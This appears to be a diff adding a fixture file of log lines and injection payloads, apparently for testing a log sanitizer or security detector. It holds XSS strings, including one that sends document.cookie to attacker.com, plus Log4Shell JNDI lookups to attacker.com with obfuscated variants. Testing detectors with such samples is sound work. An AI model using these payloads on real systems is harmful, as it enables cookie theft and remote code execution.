@@ -1,0 +1,19 @@
+[INFO] User logged in: admin
+[ERROR] Failed login attempt: admin
+[WARNING] Suspicious activity detected
+[SECURITY] Potential attack detected
+[DEBUG] Query: SELECT * FROM users WHERE username = 'admin'
+[CRITICAL] System compromise detected
+<scRiPt>alert('XSS')</sCriPt>
+<img src=x onerror=alert(document.cookie)>
+<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+${jndi:ldap://attacker.com/a}
+${jndi:rmi://attacker.com/a}
+${jndi:dns://attacker.com}
+${${env:ENV_NAME}}
+${sys:user.name}
+${sys:java.version}
+${date:yyyy-MM-dd}
+${log4j:config}
+${${lower:j}ndi:${lower:l}${lower:d}ap://attacker.com/a}
+${${::-j}ndi:${::-l}${::-d}ap://attacker.com/a}
